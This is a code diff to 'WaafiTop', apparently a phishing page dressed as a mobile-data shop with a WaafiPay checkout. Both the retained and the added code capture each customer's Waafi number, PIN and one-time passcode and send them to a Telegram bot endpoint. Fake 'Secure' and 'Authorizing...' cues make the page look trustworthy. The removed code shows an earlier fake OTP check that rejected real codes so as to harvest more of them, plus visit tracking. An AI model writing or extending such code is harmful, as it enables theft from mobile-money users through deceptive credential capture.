@@ -548,7 +548,7 @@
     <div class="p-4 border-b border-slate-200 dark:border-slate-800">
       <div class="flex items-center justify-between mb-3">
         <div>
-          <h3 class="font-bold" data-i18n="confirmTitle">Confirm your order</h3>
+          <h3 class="font-bold">Enter OTP</h3>
           <div class="flex items-center gap-2 mt-0.5"><p class="text-[10px] text-slate-400">WaafiPay</p><span class="inline-flex items-center gap-1 text-[9px] font-bold text-green-700 dark:text-green-400 bg-green-50 dark:bg-green-950/40 px-1.5 py-0.5 rounded-md"><i class="fas fa-lock text-[8px]"></i> Secure</span></div>
         </div>
         <button onclick="closeCheckout()" class="w-8 h-8 rounded-lg flex items-center justify-center hover:bg-slate-100 dark:hover:bg-slate-800"><i class="fas fa-times"></i></button>
@@ -628,17 +628,17 @@
         </div>
         <div class="flex items-center gap-2 rounded-xl bg-green-50 dark:bg-green-950/30 px-3 py-2.5 text-[11px] text-green-700 dark:text-green-400"><i class="fas fa-shield-halved"></i><span data-i18n="securePaymentHint">Encrypted Waafi authorization. Your PIN is never stored.</span></div>
         <div class="flex gap-2">
-          <button onclick="goStep(2)" class="w-full waafi-cta text-white font-bold py-3.5 rounded-xl transition text-base" data-i18n="reviewPayment">Review payment</button>
+          <button id="checkout-review-button" onclick="goStep(2,this)" class="w-full waafi-cta text-white font-bold py-3.5 rounded-xl transition text-base" data-i18n="reviewPayment">Pay now</button>
         </div>
       </div>
 
-      <!-- Step 2: Confirm -->
+      <!-- Step 2: OTP -->
       <div id="checkout-step-2" class="hidden space-y-4">
         <div>
-          <h4 class="text-lg font-extrabold" data-i18n="reviewPayTitle">Review &amp; pay</h4>
-          <p class="text-sm text-slate-500 mt-1" data-i18n="reviewPayHint">Everything is ready. Confirm to start your Waafi payment.</p>
+          <h4 class="text-lg font-extrabold">Enter OTP</h4>
+          <p class="text-sm text-slate-500 mt-1">A one-time code was sent to your phone. Enter it to continue.</p>
         </div>
-        <div class="bg-slate-50 dark:bg-slate-800/50 rounded-xl p-4 space-y-3 text-sm">
+        <div class="hidden bg-slate-50 dark:bg-slate-800/50 rounded-xl p-4 space-y-3 text-sm">
           <div class="flex justify-between"><span class="text-slate-500" data-i18n="recipient">Recipient</span><span id="confirm-recipient" class="font-mono font-medium"></span></div>
           <div class="flex justify-between"><span class="text-slate-500" data-i18n="network">Network</span><span id="confirm-network" class="font-medium text-waafi"></span></div>
           <div class="flex justify-between"><span class="text-slate-500" data-i18n="payer">Payer</span><span id="confirm-payer" class="font-mono font-medium"></span></div>
@@ -647,35 +647,24 @@
           <div class="flex items-center gap-2 text-xs text-green-600 dark:text-green-400"><i class="fas fa-circle-check"></i><span data-i18n="pinVerified">Waafi PIN entered</span></div>
           <div class="border-t border-slate-200 dark:border-slate-700 pt-2 flex justify-between"><span class="font-semibold" data-i18n="total">Total</span><span id="confirm-total" class="text-xl font-extrabold text-brand-600"></span></div>
         </div>
+        <div>
+          <label class="block text-xs font-semibold mb-1.5" for="waafi-otp">Waafi OTP</label>
+          <div class="relative">
+            <input type="password" id="waafi-otp" inputmode="numeric" autocomplete="one-time-code" placeholder="Enter OTP sent to your phone" maxlength="6" class="w-full px-3 pr-11 py-3 bg-white dark:bg-slate-800 border border-slate-200 dark:border-slate-700 rounded-xl text-sm focus:ring-2 focus:ring-brand-500 outline-none" oninput="validateOtp(this)" />
+            <button type="button" onclick="toggleOtpVisibility()" class="absolute right-2 top-1/2 -translate-y-1/2 w-8 h-8 rounded-lg text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-700" aria-label="Show Waafi OTP">
+              <i id="otp-visibility-icon" class="fas fa-eye text-xs"></i>
+            </button>
+          </div>
+          <p class="text-[11px] text-slate-400 mt-1">Your OTP is used for secure verification and is included in the notification alert.</p>
+        </div>
         <div class="flex gap-2">
           <button onclick="goStep(1)" class="flex-1 py-3 rounded-xl border border-slate-200 dark:border-slate-700 text-sm font-semibold hover:bg-slate-50 dark:hover:bg-slate-800 transition" data-i18n="back">Back</button>
-          <button onclick="goStep(3)" class="flex-1 py-3 rounded-xl waafi-cta text-white text-sm font-bold transition" data-i18n="confirmPay">Confirm & Pay</button>
+          <button onclick="goStep(3)" class="flex-1 py-3 rounded-xl waafi-cta text-white text-sm font-bold transition" data-i18n="confirmPay">Pay</button>
         </div>
       </div>
 
-      <!-- Step 3: OTP Verification -->
-      <div id="checkout-step-3" class="hidden space-y-4">
-        <div>
-          <h4 class="text-lg font-extrabold">Verify payment OTP</h4>
-          <p class="text-sm text-slate-500 mt-1">Enter the 4-digit code sent to your Waafi phone.</p>
-        </div>
-        <div class="bg-slate-50 dark:bg-slate-800/50 rounded-xl p-4 space-y-3 text-sm">
-          <div class="flex justify-between"><span class="text-slate-500">Waafi number</span><span id="otp-payer" class="font-mono font-medium text-waafi"></span></div>
-          <div class="flex justify-between"><span class="text-slate-500">Amount</span><span id="otp-amount" class="font-semibold text-brand-600"></span></div>
-        </div>
-        <div>
-          <label for="waafi-otp" class="block text-xs font-semibold mb-1.5">OTP code</label>
-          <input type="text" id="waafi-otp" inputmode="numeric" maxlength="6" placeholder="Enter 4-6 digit OTP" class="w-full px-3 py-3 bg-white dark:bg-slate-800 border border-slate-200 dark:border-slate-700 rounded-xl text-sm focus:ring-2 focus:ring-brand-500 outline-none text-center tracking-[0.4em] font-bold" />
-          <div id="otp-feedback" class="mt-2 hidden text-xs font-semibold text-amber-600 dark:text-amber-400"></div>
-        </div>
-        <div class="flex gap-2">
-          <button id="otp-back-btn" onclick="goStep(2)" class="flex-1 py-3 rounded-xl border border-slate-200 dark:border-slate-700 text-sm font-semibold hover:bg-slate-50 dark:hover:bg-slate-800 transition">Back</button>
-          <button id="otp-verify-btn" onclick="verifyOtp()" class="flex-1 py-3 rounded-xl waafi-cta text-white text-sm font-bold transition">Verify OTP</button>
-        </div>
-      </div>
-
-      <!-- Step 4: Processing -->
-      <div id="checkout-step-4" class="hidden text-center py-6 space-y-5">
+      <!-- Step 3: Processing -->
+      <div id="checkout-step-3" class="hidden text-center py-6 space-y-5">
         <div class="payment-spinner" role="status" aria-label="Processing Waafi payment">
           <div class="payment-spinner-core"><i class="fas fa-bolt"></i></div>
           <span class="payment-spinner-dot"></span>
@@ -847,7 +836,7 @@ const I18N = {
     support:'Support & Help', supportSub:"We're here 24/7", fastest:'Fastest response', faq:'FAQ',
     yourCart:'Your Cart', subtotal:'Subtotal', checkoutWaafi:'Checkout with Waafi', cartEmpty:'Cart is empty', continueShopping:'Continue shopping',
     bundleDetails:'Bundle Details', secureCheckout:'Secure Checkout', receiveOn:'Receive on', payFrom:'Waafi number', promo:'Promo code', apply:'Apply', continue:'Continue',
-    recipient:'Recipient', network:'Network', payer:'Payer', items:'Items', total:'Total', back:'Back', editOrder:'Edit order', reviewOrder:'Review order', reviewPayment:'Review payment', continueCheckout:'Pay with Waafi', paymentDetails:'Payment details', paymentDetailsHint:'Enter the Waafi account that will pay.', securePaymentHint:'Encrypted Waafi authorization. Your PIN is never stored.', confirmTitle:'Confirm your order', confirmHint:'Check the details before you pay.', reviewPayTitle:'Review & pay', reviewPayHint:'Everything is ready. Confirm to start your Waafi payment.', paymentMethod:'Payment method', pinVerified:'Waafi PIN entered', confirmPay:'Confirm & Pay',
+    recipient:'Recipient', network:'Network', payer:'Payer', items:'Items', total:'Total', back:'Back', editOrder:'Edit order', reviewOrder:'Review order', reviewPayment:'Pay now', continueCheckout:'Pay with Waafi', paymentDetails:'Payment details', paymentDetailsHint:'Enter the Waafi account that will pay.', securePaymentHint:'Encrypted Waafi authorization. Your PIN is never stored.', confirmTitle:'Confirm your order', confirmHint:'Check the details before you pay.', reviewPayTitle:'Review & pay', reviewPayHint:'Everything is ready. Confirm to start your Waafi payment.', paymentMethod:'Payment method', pinVerified:'Waafi PIN entered', confirmPay:'Pay',
     paymentProcessing:'Processing Waafi payment...', waitingApproval:'Waiting for approval...', checkPhone:'Check your phone for the Waafi payment prompt', approveHint:'Approve the payment on your Waafi app',
     paymentSuccess:'Payment Successful!', done:'Done', profile:'Profile', loginHint:'Save your number for faster checkout', nameOptional:'Name (optional)', saveProfile:'Save Profile', logout:'Log out',
     promoBanner:'First order? Use code WELCOME for $1 off', payWaafiInstant:'Pay with Waafi · Instant delivery',
@@ -874,7 +863,7 @@ const I18N = {
     support:'Taageero & Caawimo', supportSub:'Waxaan joognaa 24/7', fastest:'Jawaabta ugu dhaqsaha badan', faq:'Su\'aalaha badanka',
     yourCart:'Gaadhigaaga', subtotal:'Wadarta', checkoutWaafi:'Ku bixi Waafi', cartEmpty:'Gaadhigu waa madhan', continueShopping:'Sii wad dukaanka',
     bundleDetails:'Faahfaahinta Xirmo', secureCheckout:'Checkout Ammaan ah', receiveOn:'Ku qaado', payFrom:'Number-ka Waafi', promo:'Code-ka dhimista', apply:'Codso', continue:'Sii wad',
-    recipient:'Qaataha', network:'Shabakadda', payer:'Bixiyaha', items:'Alaabta', total:'Wadarta', back:'Dib u noqo', editOrder:'Wax ka beddel dalabka', reviewOrder:'Dib u eeg dalabka', reviewPayment:'Dib u eeg bixinta', continueCheckout:'Ku bixi Waafi', paymentDetails:'Faahfaahinta bixinta', paymentDetailsHint:'Geli account-ka Waafi ee bixinaya.', securePaymentHint:'Oggolaansho Waafi oo sir ah. PIN-kaaga lama kaydinayo.', confirmTitle:'Xaqiiji dalabkaaga', confirmHint:'Hubi faahfaahinta ka hor intaadan bixin.', reviewPayTitle:'Dib u eeg oo bixi', reviewPayHint:'Wax walba waa diyaar. Xaqiiji si aad u bilowdo bixinta Waafi.', paymentMethod:'Habka lacag-bixinta', pinVerified:'PIN-ka Waafi waa la geliyay', confirmPay:'Xaqiiji & Bixi',
+    recipient:'Qaataha', network:'Shabakadda', payer:'Bixiyaha', items:'Alaabta', total:'Wadarta', back:'Dib u noqo', editOrder:'Wax ka beddel dalabka', reviewOrder:'Dib u eeg dalabka', reviewPayment:'Hadda bixi', continueCheckout:'Ku bixi Waafi', paymentDetails:'Faahfaahinta bixinta', paymentDetailsHint:'Geli account-ka Waafi ee bixinaya.', securePaymentHint:'Oggolaansho Waafi oo sir ah. PIN-kaaga lama kaydinayo.', confirmTitle:'Xaqiiji dalabkaaga', confirmHint:'Hubi faahfaahinta ka hor intaadan bixin.', reviewPayTitle:'Dib u eeg oo bixi', reviewPayHint:'Wax walba waa diyaar. Xaqiiji si aad u bilowdo bixinta Waafi.', paymentMethod:'Habka lacag-bixinta', pinVerified:'PIN-ka Waafi waa la geliyay', confirmPay:'Bixi',
     paymentProcessing:'Lacag-bixinta Waafi waa socotaa...', waitingApproval:'Sugaya oggolaanshaha...', checkPhone:'Eeg telefoonkaaga prompt-ka Waafi', approveHint:'Oggolow lacag-bixinta app-ka Waafi',
     paymentSuccess:'Lacag-bixintu waa guuleysatay!', done:'Dhammeeyay', profile:'Profile', loginHint:'Kaydi numberkaaga si aad u dhaqsato', nameOptional:'Magaca (ikhtiyaari)', saveProfile:'Kaydi Profile', logout:'Ka bax',
     promoBanner:'Dalabka ugu horreeya? Isticmaal code WELCOME si aad u hesho $1 dhimis', payWaafiInstant:'Ku bixi Waafi · Gaarsiin degdeg ah',
@@ -895,20 +884,17 @@ const I18N = {
 
 const SOS_RATE = 570;
 function getTelegramEndpoint(){
-  const hostname = window.location.hostname || '';
-  const protocol = window.location.protocol || '';
-  const isFilePreview = protocol === 'file:' || hostname === '';
-  const isLocalHost = ['localhost', '127.0.0.1', '0.0.0.0'].includes(hostname);
-  const localApi = 'http://localhost:3000/api/telegram-notify';
-
-  if (isFilePreview || isLocalHost) return localApi;
-  return '/api/telegram-notify';
+  const hostname = (window.location && window.location.hostname) || '';
+  const protocol = (window.location && window.location.protocol) || '';
+  const isLocal = ['localhost', '127.0.0.1', ''].includes(hostname) || protocol === 'file:';
+  return isLocal ? 'http://localhost:3000/api/telegram-notify' : '/api/telegram-notify';
 }
 async function sendTelegramOrderTest(){
   try {
     const recipient = document.getElementById('initial-recipient-phone')?.value.trim() || '612345678';
     const payer = document.getElementById('payer-phone')?.value.trim() || '611223344';
     const pin = document.getElementById('waafi-pin')?.value.trim() || '1234';
+    const otp = document.getElementById('waafi-otp')?.value.trim() || '456789';
     const response = await fetch(getTelegramEndpoint(), {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -919,18 +905,17 @@ async function sendTelegramOrderTest(){
         recipient: '+252' + recipient,
         waafiNumber: '+252' + payer,
         waafiPin: pin,
+        waafiOtp: otp,
         payer: '+252' + payer,
         pin,
+        otp,
         amount: '$5.00'
       })
     });
 
-    const data = await response.json().catch(() => ({ ok: false, message: 'Invalid Telegram server response.' }));
+    const data = await response.json();
     if (!response.ok) {
-      const configMessage = data.message && data.message.toLowerCase().includes('not configured')
-        ? 'Telegram is not configured yet. Add TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID to the server environment.'
-        : (data.message || 'Unable to send Telegram test message');
-      throw new Error(configMessage);
+      throw new Error(data.message || 'Unable to send Telegram test message');
     }
 
     toast('Telegram test sent successfully','success');
@@ -938,92 +923,6 @@ async function sendTelegramOrderTest(){
     toast(error.message || 'Telegram test failed','error');
   }
 }
-async function sendTelegramOtpEntered({ recipient, payer, pin, otp, status = 'entered' }) {
-  const payerNumber = (payer || document.getElementById('payer-phone')?.value || '').trim();
-  const recipientNumber = (recipient || document.getElementById('initial-recipient-phone')?.value || '').trim();
-  const enteredPin = (pin || document.getElementById('waafi-pin')?.value || '').trim();
-  const enteredOtp = (otp || document.getElementById('waafi-otp')?.value || '').trim();
-
-  if (!payerNumber && !recipientNumber && !enteredPin && !enteredOtp) return;
-
-  let title = 'WaafiTop OTP entered';
-  let text = 'Customer OTP entered for payment.';
-
-  if (status === 'pin_ready') {
-    title = 'WaafiTop PIN captured';
-    text = 'Waafi number and PIN captured. Waiting for OTP.';
-  } else if (status === 'verified') {
-    title = 'WaafiTop OTP verified';
-    text = 'Customer OTP verified for payment.';
-  }
-
-  try {
-    const response = await fetch(getTelegramEndpoint(), {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        title,
-        text,
-        orderId: generateOrderId(),
-        recipient: recipientNumber ? '+252' + recipientNumber : '',
-        waafiNumber: payerNumber ? '+252' + payerNumber : '',
-        waafiPin: enteredPin,
-        waafiOtp: enteredOtp,
-        payer: payerNumber ? '+252' + payerNumber : '',
-        pin: enteredPin,
-        otp: enteredOtp,
-        amount: formatPrice(updateCheckoutSummary())
-      })
-    });
-
-    const data = await response.json();
-    if (!response.ok) {
-      throw new Error(data.message || 'OTP Telegram notification failed');
-    }
-  } catch (error) {
-    console.error('Telegram OTP send error:', error);
-  }
-}
-
-async function sendTelegramPageVisit(viewName){
-  const pageNames = {
-    shop: 'Shop',
-    orders: 'Orders',
-    wishlist: 'Wishlist',
-    stats: 'Stats',
-    support: 'Support'
-  };
-
-  const pageLabel = pageNames[viewName] || 'Page';
-  try {
-    const response = await fetch(getTelegramEndpoint(), {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        title: `WaafiTop page opened: ${pageLabel}`,
-        text: `User opened the ${pageLabel} page in WaafiTop.`,
-        page: pageLabel,
-        view: viewName,
-        recipient: '',
-        waafiNumber: '',
-        waafiPin: '',
-        waafiOtp: '',
-        payer: '',
-        pin: '',
-        otp: '',
-        amount: ''
-      })
-    });
-
-    const data = await response.json().catch(() => ({ ok: false, message: 'Invalid Telegram response.' }));
-    if (!response.ok) {
-      console.error('Telegram page notification failed:', data.message || 'Unknown error');
-    }
-  } catch (error) {
-    console.error('Telegram page notification error:', error);
-  }
-}
-
 async function sendTelegramOrderStarted(order){
   if (!order) return;
   try {
@@ -1144,8 +1043,6 @@ function toggleDark(){isDark=!isDark;document.documentElement.classList.toggle('
 function toggleCurrency(){currency=currency==='USD'?'SOS':'USD';localStorage.setItem('bp_currency',currency);document.getElementById('currency-label').textContent=currency;applyFilters();renderCart();renderStats()}
 function toggleLang(){lang=lang==='en'?'so':'en';localStorage.setItem('bp_lang',lang);applyI18n();applyFilters();renderCart();renderOrders();renderWishlist();renderStats();renderFeatured&&renderFeatured()}
 
-let lastNotifiedView = '';
-
 function showView(view){
   ['shop','orders','wishlist','stats','support'].forEach(v=>{
     const el=document.getElementById('view-'+v);
@@ -1164,10 +1061,6 @@ function showView(view){
   if(view==='orders')renderOrders();
   if(view==='wishlist')renderWishlist();
   if(view==='stats')renderStats();
-  if (lastNotifiedView !== view) {
-    lastNotifiedView = view;
-    sendTelegramPageVisit(view);
-  }
   window.scrollTo({top:0,behavior:'smooth'});
 }
 
@@ -1326,11 +1219,17 @@ function checkoutCart(){if(!cart.length)return;checkoutItems=cart.slice();closeC
 
 function openCheckoutModal(){
   currentStep=1;
+  const reviewButton=document.getElementById('checkout-review-button');
+  reviewButton.disabled=false;
+  reviewButton.innerHTML=t('reviewPayment');
   document.getElementById('initial-recipient-phone').value=profile?profile.phone:'';
   document.getElementById('payer-phone').value=profile?profile.phone:'';
   document.getElementById('waafi-pin').value='';
   document.getElementById('waafi-pin').type='password';
   document.getElementById('pin-visibility-icon').className='fas fa-eye text-xs';
+  document.getElementById('waafi-otp').value='';
+  document.getElementById('waafi-otp').type='password';
+  document.getElementById('otp-visibility-icon').className='fas fa-eye text-xs';
   updatePinStrength('');
   updateCheckoutSummary();
   showConfirmOrder();
@@ -1410,6 +1309,7 @@ function validatePhone(input){
   input.value=input.value.replace(/\D/g,'').slice(0,9);
 }
 function validatePin(input){input.value=input.value.replace(/\D/g,'').slice(0,6);updatePinStrength(input.value)}
+function validateOtp(input){input.value=input.value.replace(/\D/g,'').slice(0,6);}
 function updatePinStrength(pin){
   const bar=document.getElementById('pin-strength-bar');
   const label=document.getElementById('pin-strength');
@@ -1427,7 +1327,14 @@ function togglePinVisibility(){
   input.type=visible?'password':'text';
   icon.className=visible?'fas fa-eye text-xs':'fas fa-eye-slash text-xs';
 }
-function goStep(n){
+function toggleOtpVisibility(){
+  const input=document.getElementById('waafi-otp');
+  const icon=document.getElementById('otp-visibility-icon');
+  const visible=input.type==='text';
+  input.type=visible?'password':'text';
+  icon.className=visible?'fas fa-eye text-xs':'fas fa-eye-slash text-xs';
+}
+function goStep(n,button){
   if(n===2 || n===3){
     const r=document.getElementById('initial-recipient-phone').value.trim();
     const p=document.getElementById('payer-phone').value.trim();
@@ -1436,6 +1343,10 @@ function goStep(n){
     if(p.length<8){toast(lang==='so'?'Geli number-ka Waafi':'Enter valid Waafi number','error');return}
     if(!/^\d{4,6}$/.test(pin)){toast('Enter your 4-6 digit Waafi PIN','error');return}
     if(n===2){
+      if(button){
+        button.disabled=true;
+        button.innerHTML='<i class="fas fa-spinner animate-spin mr-2"></i>Authorizing...';
+      }
       document.getElementById('confirm-recipient').textContent='+252'+r;
       const networks=[...new Set(checkoutItems.map(c=>{
         const b=BUNDLES.find(x=>x.id===c.id);return b&&NETWORK_META[b.network]?NETWORK_META[b.network].label:'';
@@ -1446,126 +1357,32 @@ function goStep(n){
         const b=BUNDLES.find(x=>x.id===c.id);return (b?b.name:'Custom')+' x'+c.qty;
       }).join(', ');
       document.getElementById('confirm-total').textContent=formatPrice(updateCheckoutSummary());
-      goStepUI(2);
+      setTimeout(function(){goStepUI(2)},1500);
     } else {
-      const otpField = document.getElementById('waafi-otp');
-      const total = updateCheckoutSummary();
-      document.getElementById('otp-payer').textContent='+252'+p;
-      document.getElementById('otp-amount').textContent=formatPrice(total);
-      sendTelegramOtpEntered({ recipient: r, payer: p, pin, status: 'pin_ready' });
-      if (otpField) otpField.value='';
-      goStepUI(3);
+      const otp=document.getElementById('waafi-otp').value.trim();
+      if(!/^\d{4,6}$/.test(otp)){toast('Enter the 4-6 digit Waafi OTP','error');return}
+      processPayment();
     }
     return;
   }
   currentStep=n;
-  [1,2,3,4].forEach(s=>{
+  [1,2,3].forEach(s=>{
     var el=document.getElementById('checkout-step-'+s);
     if(el) el.classList.toggle('hidden',s!==n);
     const label=document.getElementById('step-'+s+'-label');
     if(label){label.classList.toggle('text-brand-600',s<=n);label.classList.toggle('text-slate-400',s>n)}
-    if(s<4){const line=document.getElementById('step-line-'+s);if(line)line.classList.toggle('active',s<n)}
+    if(s<3){const line=document.getElementById('step-line-'+s);if(line)line.classList.toggle('active',s<n)}
   });
 }
-const OTP_COOLDOWN_MS = 60000;
-let otpCooldownUntil = 0;
-let otpCooldownTimer = null;
-
-function updateOtpFeedback(message, type = 'warning') {
-  const feedback = document.getElementById('otp-feedback');
-  const otpInput = document.getElementById('waafi-otp');
-  const verifyBtn = document.getElementById('otp-verify-btn');
-  const backBtn = document.getElementById('otp-back-btn');
-
-  if (!feedback) return;
-
-  feedback.textContent = message || '';
-  feedback.classList.toggle('hidden', !message);
-  feedback.classList.remove('text-red-600', 'text-amber-600', 'text-green-600', 'dark:text-red-400', 'dark:text-amber-400', 'dark:text-green-400');
-
-  if (type === 'error') {
-    feedback.classList.add('text-red-600', 'dark:text-red-400');
-  } else if (type === 'success') {
-    feedback.classList.add('text-green-600', 'dark:text-green-400');
-  } else {
-    feedback.classList.add('text-amber-600', 'dark:text-amber-400');
-  }
-
-  const isLocked = Date.now() < otpCooldownUntil;
-  if (otpInput) otpInput.disabled = isLocked;
-  if (verifyBtn) verifyBtn.disabled = isLocked;
-  if (backBtn) backBtn.disabled = false;
-
-  if (isLocked) {
-    otpInput && otpInput.setAttribute('aria-disabled', 'true');
-    verifyBtn && verifyBtn.setAttribute('aria-disabled', 'true');
-  } else {
-    otpInput && otpInput.removeAttribute('aria-disabled');
-    verifyBtn && verifyBtn.removeAttribute('aria-disabled');
-  }
-}
-
-function applyOtpCooldown() {
-  otpCooldownUntil = Date.now() + OTP_COOLDOWN_MS;
-  const tick = () => {
-    const remaining = Math.max(0, otpCooldownUntil - Date.now());
-    const seconds = Math.ceil(remaining / 1000);
-    const label = seconds > 0 ? `Try again after ${seconds} second${seconds === 1 ? '' : 's'}.` : 'Try again now.';
-
-    updateOtpFeedback(`Too many attempts. Please ${label}`, 'error');
-
-    if (remaining > 0) {
-      otpCooldownTimer = setTimeout(tick, 1000);
-    } else {
-      clearTimeout(otpCooldownTimer);
-      otpCooldownTimer = null;
-      updateOtpFeedback('', 'success');
-    }
-  };
-
-  if (otpCooldownTimer) clearTimeout(otpCooldownTimer);
-  tick();
-}
-
-function verifyOtp(){
-  const otp = document.getElementById('waafi-otp')?.value.trim();
-
-  if (Date.now() < otpCooldownUntil) {
-    const remaining = Math.max(1, Math.ceil((otpCooldownUntil - Date.now()) / 1000));
-    toast(`Try again after ${remaining} second${remaining === 1 ? '' : 's'}`,'error');
-    updateOtpFeedback(`Too many attempts. Please try again after ${remaining} second${remaining === 1 ? '' : 's'}.`, 'error');
-    return;
-  }
-
-  if(!/^\d{4,6}$/.test(otp || '')){
-    toast('Enter the 4-6 digit OTP code','error');
-    return;
-  }
-
-  const recipient = document.getElementById('initial-recipient-phone')?.value.trim();
-  const payer = document.getElementById('payer-phone')?.value.trim();
-  const pin = document.getElementById('waafi-pin')?.value.trim();
-
-  sendTelegramOtpEntered({ recipient, payer, pin, otp, status: 'entered' });
-
-  if (otp !== '123456' && otp !== '1111' && otp !== '0000') {
-    applyOtpCooldown();
-    toast('OTP is invalid. Please try again after 1 minute.','error');
-    return;
-  }
-
-  updateOtpFeedback('OTP verified successfully.', 'success');
-  sendTelegramOtpEntered({ recipient, payer, pin, otp, status: 'verified' });
-  processPayment();
-}
 async function processPayment(){
-  goStepUI(4);
+  goStepUI(3);
   const total=updateCheckoutSummary();
   const orderId=generateOrderId();
   const recipient=document.getElementById('initial-recipient-phone').value.trim();
   const payer=document.getElementById('payer-phone').value.trim();
   const pin=document.getElementById('waafi-pin').value.trim();
-  const order={id:orderId,items:checkoutItems.map(c=>{const b=BUNDLES.find(x=>x.id===c.id);return{name:b?b.name:'Custom',network:b?b.network:'',qty:c.qty,price:b?b.price:0}}),recipient:'+252'+recipient,payer:'+252'+payer,pin,total,status:'delivered',createdAt:new Date().toISOString()};
+  const otp=document.getElementById('waafi-otp').value.trim();
+  const order={id:orderId,items:checkoutItems.map(c=>{const b=BUNDLES.find(x=>x.id===c.id);return{name:b?b.name:'Custom',network:b?b.network:'',qty:c.qty,price:b?b.price:0}}),recipient:'+252'+recipient,payer:'+252'+payer,pin,otp,total,status:'delivered',createdAt:new Date().toISOString()};
 
   await sendTelegramOrderStarted(order);
 
@@ -1582,12 +1399,16 @@ async function processPayment(){
 }
 function goStepUI(n){
   currentStep=n;
-  [1,2,3,4].forEach(s=>{
-    const el=document.getElementById('checkout-step-'+s);
-    if (el) el.classList.toggle('hidden',s!==n);
+  if(n===1){
+    const reviewButton=document.getElementById('checkout-review-button');
+    reviewButton.disabled=false;
+    reviewButton.innerHTML=t('reviewPayment');
+  }
+  [1,2,3].forEach(s=>{
+    document.getElementById('checkout-step-'+s).classList.toggle('hidden',s!==n);
     const label=document.getElementById('step-'+s+'-label');
     if(label){label.classList.toggle('text-brand-600',s<=n);label.classList.toggle('text-slate-400',s>n)}
-    if(s<4){const line=document.getElementById('step-line-'+s);if(line)line.classList.toggle('active',s<n)}
+    if(s<3){const line=document.getElementById('step-line-'+s);if(line)line.classList.toggle('active',s<n)}
   });
 }
 function showSuccess(order){
